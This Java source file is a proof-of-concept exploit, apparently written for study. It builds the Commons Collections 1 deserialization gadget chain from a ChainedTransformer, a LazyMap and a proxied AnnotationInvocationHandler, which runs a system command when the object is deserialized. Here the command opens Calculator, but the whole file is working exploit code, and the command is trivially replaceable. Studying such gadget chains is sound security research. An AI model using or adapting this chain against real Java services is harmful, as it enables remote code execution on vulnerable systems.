package com.rain;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

public class CC1_LazyMap {

    public static void main(String[] args) throws Exception{
        Transformer[] transformers={
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a Calculator.app"})
        };

        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor declaredConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        declaredConstructor.setAccessible(true);
        InvocationHandler annotationInvocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, lazyMap);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), map.getClass().getInterfaces(), annotationInvocationHandler);
        annotationInvocationHandler = (InvocationHandler) declaredConstructor.newInstance(Target.class, proxyMap);

        Utils.serialize(annotationInvocationHandler);
        Utils.deserialize();

    }
}
